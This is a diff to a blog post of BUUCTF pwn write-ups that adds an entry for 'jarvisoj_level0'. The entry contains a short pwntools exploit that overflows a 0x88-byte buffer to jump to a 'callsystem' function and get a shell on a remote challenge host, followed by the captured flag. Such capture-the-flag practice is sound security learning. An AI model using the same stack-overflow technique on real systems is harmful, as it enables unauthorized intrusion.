@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: BUUCTF"
 published: 2025-07-05
-updated: 2025-07-05
+updated: 2025-07-06
 description: "Write-ups for BUUCTF's pwn aspect."
 image: "./covers/buuctf.png"
 tags: ["Pwn", "Write-ups"]
@@ -423,3 +423,69 @@ if __name__ == "__main__":
 ## Flag
 
 Flag: `flag{db1e1ee0-907b-497b-85eb-9fe936bf26e7}`
+
+# jarvisoj_level0
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+闹着玩呢？不写了，和第一题差不多。
+
+## Exploit
+
+```python
+#!/usr/bin/python
+
+from pwn import ROP, args, context, flat, gdb, process, remote
+
+gdbscript = """
+c
+"""
+
+FILE = "./level0"
+HOST, PORT = "node5.buuoj.cn", 27572
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+    if args.D:
+        gdb.attach(target, gdbscript=gdbscript)
+
+    return target
+
+
+def construct_payload():
+    elf = context.binary
+    rop = ROP(elf)
+
+    payload = flat(b"A" * 0x88, rop.ret.address, elf.symbols["callsystem"])
+
+    return payload
+
+
+def main():
+    target = launch()
+
+    payload = construct_payload()
+
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+Flag: `flag{05ce7df6-bb73-4445-9abd-b107d55cede1}`
